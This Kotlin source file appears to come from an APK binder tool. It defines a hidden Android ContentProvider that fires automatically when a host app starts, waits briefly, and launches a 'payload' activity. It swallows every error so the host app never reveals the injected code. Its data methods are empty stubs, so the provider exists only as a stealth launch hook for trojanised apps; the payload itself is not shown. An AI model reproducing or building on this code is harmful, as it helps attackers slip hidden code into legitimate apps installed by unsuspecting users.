package Com.devhs.apkbinder.payload

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper

class PayloadProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        try {
            val ctx = context ?: return true
            HsLog.init(ctx)
            HsLog.w("Provider.onCreate fired")
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    launchGate(ctx)
                } catch (t: Throwable) {
                    HsLog.e("launchGate failed: ${t.javaClass.simpleName} ${t.message}")
                }
            }, 900L)
        } catch (t: Throwable) {
            // never let the host app crash because of us
        }
        return true
    }

    private fun launchGate(ctx: Context) {
        val i = Intent()
        i.setClassName(ctx.packageName, Const.PAYLOAD_ACTIVITY)
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        i.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
        ctx.startActivity(i)
        HsLog.w("Gate started")
    }

    override fun query(
        uri: Uri, projection: Array<String>?, selection: String?,
        selectionArgs: Array<String>?, sortOrder: String?
    ): Cursor? = null

    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, a: Array<String>?): Int = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}
